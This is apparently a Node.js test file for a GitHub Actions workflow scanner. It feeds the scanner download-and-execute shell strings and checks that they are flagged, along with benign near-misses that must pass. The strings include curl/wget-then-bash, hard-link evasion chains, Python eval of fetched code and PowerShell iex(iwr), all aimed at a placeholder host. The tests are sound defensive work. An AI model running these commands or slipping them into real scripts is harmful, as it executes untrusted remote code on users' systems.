'use strict';
// New Codex P1 regressions: inert shell input strings only, never executed.
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/build';
const attacks=[
 ['curl-attached','curl -fsSL '+U+' -opayload; bash payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['wget-attached','wget -q '+U+' -Orun.sh; sh run.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['hard-link','curl -fsSL '+U+' -o payload; ln payload run.sh; bash run.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['hard-link-chain','curl -fsSL '+U+' -o payload; ln payload tmp.sh; ln tmp.sh run.sh; sh run.sh','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['python-eval','python -c "import urllib.request; eval(urllib.request.urlopen(\''+U+'\').read())"','REMOTE_INTERPRETER_FETCH_EXECUTION'],
 ['python3-eval',"python3 - <<'PY'\nimport requests\nu='"+U+"'\neval(requests.get(u).text)\nPY",'REMOTE_INTERPRETER_FETCH_EXECUTION'],
 ['pwsh-argument','iex (iwr '+U+').Content','REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['pwsh-full-argument','Invoke-Expression (Invoke-WebRequest '+U+').Content','REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['pwsh-inline-argument','pwsh -Command "iex (iwr '+U+').Content"','REMOTE_POWERSHELL_EXECUTION']
];
function inspect(script,shell){
 const content=['on: issues','permissions: read-all','jobs:','  audit:',
 '    runs-on: ubuntu-latest','    steps:','      - run: |',
 ...script.split('\n').map(l=>'          '+l),
 ...(shell?['        shell: '+shell]:[])].join('\n');
 return inspectWorkflow(content,{path:'.github/workflows/attacker-variations.yml'});
}
for(const [name,script,rule,shell] of attacks){
 test('Codex P1 RED '+name,()=>{
  assert.ok(findingsForScript(script,{shell}).includes(rule),name+' direct scanner');
  const result=inspect(script,shell);
  assert.ok(result.findings.some(x=>x.rule===rule&&x.severity==='HIGH'),name+' / '+JSON.stringify(result));
 });
}
for(const [name,script,shell] of [
 ['curl-data','curl -fsSL '+U+' -opayload; echo payload'],
 ['link-data','curl -fsSL '+U+' -o payload; ln payload report.txt; echo report.txt'],
 ['python-log','python -c "import urllib.request; print(urllib.request.urlopen(\''+U+'\').read())"'],
 ['pwsh-fetch-only','iwr '+U,'pwsh'],
 ['pwsh-quoted','Write-Host "iex (iwr '+U+').Content"','pwsh'],
 ['local-eval','python -c "eval(1+2)"']
]){
 test('Codex P1 benign '+name,()=>assert.deepEqual(findingsForScript(script,{shell}),[],name));
}
